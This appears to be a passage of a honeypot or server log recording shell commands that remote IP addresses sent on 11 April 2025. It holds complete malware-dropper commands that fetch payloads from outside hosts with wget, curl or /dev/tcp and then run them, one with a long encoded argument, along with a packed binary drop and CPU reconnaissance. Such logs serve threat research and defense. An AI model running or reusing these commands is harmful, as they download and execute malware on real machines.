+2025-04-11 21:07:11 from 45.135.193.100: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget 87.121.84.211/bash; curl -O 87.121.84.211/bash; chmod 777 bash; sh bash; rm -rf bash; rm -rf bash.1
+2025-04-11 21:07:13 from 45.135.193.100: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget 87.121.84.211/bash; curl -O 87.121.84.211/bash; chmod 777 bash; sh bash; rm -rf bash; rm -rf bash.1
+2025-04-11 21:07:15 from 45.135.193.100: /bin/sh
+2025-04-11 22:41:21 from 8.152.196.6: echo 1 && cat /bin/echo
+2025-04-11 22:41:29 from 8.152.196.6: nohup $SHELL -c "curl http://8.134.133.133:60103/linux -o /tmp/TsBugL4kZf; if [ ! -f /tmp/TsBugL4kZf ]; then wget http://8.134.133.133:60103/linux -O /tmp/TsBugL4kZf; fi; if [ ! -f /tmp/TsBugL4kZf ]; then exec 6<>/dev/tcp/8.134.133.133/60103 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/TsBugL4kZf ; chmod +x /tmp/TsBugL4kZf && /tmp/TsBugL4kZf 1yxN2JtSVYHBSD6stDVA1YNQUYXfWTS0qD5LwYRXVJveTDygrDxI3oRAVILBQTq0qDVX3oRZWoPfSDivujhOwYRSUpveSjy0qz1D2YVRU4TPTTu0qD9PwYdUWZvXSDasqj1L3JVRUYHBTDm0ojRX3YRTWoPfSDipujRX3oZUToTcSiKrqT9D2YVRUIbPTTu0qDhKwYRSV5veTTygrDxI24ZAVILBSD6qtDtOwYdSUY/ZST2poixN2JtSU4zBQTy0qz1K1YNQUYbfWT6rqyJI24xOUYPfVz6rrjZP34RUWJXbTiKoqTtX3IVOUYXYQzqqqz5Lz4FXTofcTyKoqiJN1o9WUITdSSyurSJL3IJOWIXBSDiqoDpJ3odWQIHYVz6prSJB2ZtRWIPVTzyrrjtZ24JOUobZVz6uqSJI24ZaVoXeST66rjtX2INOUYbZVz2rojZP34RSUZXXVz2vqCJI1oNOVo/ZST2poixN2JtRUofBSD+qtD1I1YNQUYbeWTittD5K2ZtSUJvbQDasqj1L35VUV5vdSjW0ojxX3oRTWoPfSD+qujhOwYdUU5vdSiKpojZP34RTV5XbTiKoqTtX14VOUYHfQzqqqz5Pz4RRVJvaTCKioiJL3oZaVoXeTT+6qz9NwYRXVZvdSDq0qz9A1YNQUYHbWTittDRPwYRXVpvaSTasqj1N2pVRVoDBSDmutD1O3ptRVYLVTzyrqTVZ24JOUoDdVzujtDpJ1YNQUYfWWTittD5K1ptRUIbBQTasqj1N35VSUIbBTDu0qD5MwYdVUI/ZST2rqqi0ML3foMBqUkm4MnV5; fi; echo 123456 > /tmp/.opass; chmod +x /tmp/TsBugL4kZf && /tmp/TsBugL4kZf 1yxN2JtSVYHBSD6stDVA1YNQUYXfWTS0qD5LwYRXVJveTDygrDxI3oRAVILBQTq0qDVX3oRZWoPfSDivujhOwYRSUpveSjy0qz1D2YVRU4TPTTu0qD9PwYdUWZvXSDasqj1L3JVRUYHBTDm0ojRX3YRTWoPfSDipujRX3oZUToTcSiKrqT9D2YVRUIbPTTu0qDhKwYRSV5veTTygrDxI24ZAVILBSD6qtDtOwYdSUY/ZST2poixN2JtSU4zBQTy0qz1K1YNQUYbfWT6rqyJI24xOUYPfVz6rrjZP34RUWJXbTiKoqTtX3IVOUYXYQzqqqz5Lz4FXTofcTyKoqiJN1o9WUITdSSyurSJL3IJOWIXBSDiqoDpJ3odWQIHYVz6prSJB2ZtRWIPVTzyrrjtZ24JOUobZVz6uqSJI24ZaVoXeST66rjtX2INOUYbZVz2rojZP34RSUZXXVz2vqCJI1oNOVo/ZST2poixN2JtRUofBSD+qtD1I1YNQUYbeWTittD5K2ZtSUJvbQDasqj1L35VUV5vdSjW0ojxX3oRTWoPfSD+qujhOwYdUU5vdSiKpojZP34RTV5XbTiKoqTtX14VOUYHfQzqqqz5Pz4RRVJvaTCKioiJL3oZaVoXeTT+6qz9NwYRXVZvdSDq0qz9A1YNQUYHbWTittDRPwYRXVpvaSTasqj1N2pVRVoDBSDmutD1O3ptRVYLVTzyrqTVZ24JOUoDdVzujtDpJ1YNQUYfWWTittD5K1ptRUIbBQTasqj1N35VSUIbBTDu0qD5MwYdVUI/ZST2rqqi0ML3foMBqUkm4MnV5" &
+2025-04-11 22:41:29 from 8.152.196.6: head -c 3610344 > /tmp/ZRV8YUGIS4
+2025-04-11 22:41:29 from 8.152.196.6: echo 1 && cat /bin/echoQtd#UPX!
+2025-04-11 22:41:29 from 8.152.196.6: A@/~'8
+2025-04-11 22:48:09 from 45.135.193.100: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget 87.121.84.211/bash; curl -O 87.121.84.211/bash; chmod 777 bash; sh bash; rm -rf bash; rm -rf bash.1
+2025-04-11 22:48:11 from 45.135.193.100: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget 87.121.84.211/bash; curl -O 87.121.84.211/bash; chmod 777 bash; sh bash; rm -rf bash; rm -rf bash.1
+2025-04-11 22:48:12 from 45.135.193.100: /bin/sh
+2025-04-11 23:38:45 from 211.118.215.16: grep -c ^processor /proc/cpuinfo
+2025-04-11 23:39:20 from 211.118.215.16: grep -c ^processor /proc/cpuinfo
